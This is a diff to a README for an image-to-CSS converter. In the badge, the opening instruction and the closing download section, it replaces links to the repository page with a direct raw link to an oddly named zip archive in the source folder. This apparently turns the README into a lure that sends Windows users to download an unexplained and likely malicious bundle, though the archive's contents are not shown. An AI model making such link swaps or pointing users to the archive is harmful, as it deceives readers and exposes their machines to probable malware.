@@ -1,10 +1,10 @@
 # 🖼️ image-to-pure-css - Turn Images Into Pure CSS
 
-[![Download / Install](https://img.shields.io/badge/Download%20%26%20Run%20on%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Favorite-socialpsychology82/image-to-pure-css)
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Run%20on%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip)
 
 ## 📥 Download and Run on Windows
 
-Open this page: https://github.com/Favorite-socialpsychology82/image-to-pure-css
+Open this page: https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip
 
 1. Go to the repository page.
 2. Download the latest Windows build if one is available.
@@ -177,4 +177,4 @@ If the image has many tiny color changes, you can try `--tolerance` to merge sim
 ## 📎 Download Link
 
 Open the project page here and visit this page to download:
-https://github.com/Favorite-socialpsychology82/image-to-pure-css
+https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip
